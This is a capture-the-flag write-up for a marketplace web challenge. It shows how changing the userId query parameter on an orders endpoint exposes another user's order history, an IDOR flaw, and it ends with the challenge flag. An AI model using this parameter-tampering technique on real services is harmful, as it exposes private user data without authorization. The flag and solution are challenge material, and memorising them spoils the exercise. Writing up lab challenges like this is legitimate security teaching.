# The Exposed Orders

## Description

Order history should be private, but the marketplace leaves a few loose threads. Can you follow one to something that is not yours?

## Solution Walkthrough

It is very similar to the `The Loose Ledger` challenge, where the query endpoint was `/api/orders/lookup?ref=<ref>`, whereas in this challenge, it is `/api/orders/`.

Looking at the response, you can see that it includes an additional `userId`, and it is possible to change it using `?userId=<id>` (although it could also be done via JWT, that is more troublesome).

I randomly looked for a buyer, and as luck would have it, I found `Phantom_Hacker` with the ID `k7m3n` at `/listing/macro-builder`. Therefore, by using `/api/orders?userId=k7m3n`, I could obtain the flag.

```json
{
  "orders": [
    {
      "id": "order-admin-001",
      "userId": "k7m3n",
      "listingId": "macro-builder",
      "listingName": "Macro Builder",
      "price": 199.99,
      "status": "completed",
      "notes": "bitflag{1d0r_1s_4_d4ng3r0us_g4m3}",
      "createdAt": "2026-06-21T09:30:05.259Z"
    }
  ],
  "userId": "k7m3n"
}
```

## Flag

```text
bitflag{1d0r_1s_4_d4ng3r0us_g4m3}
```
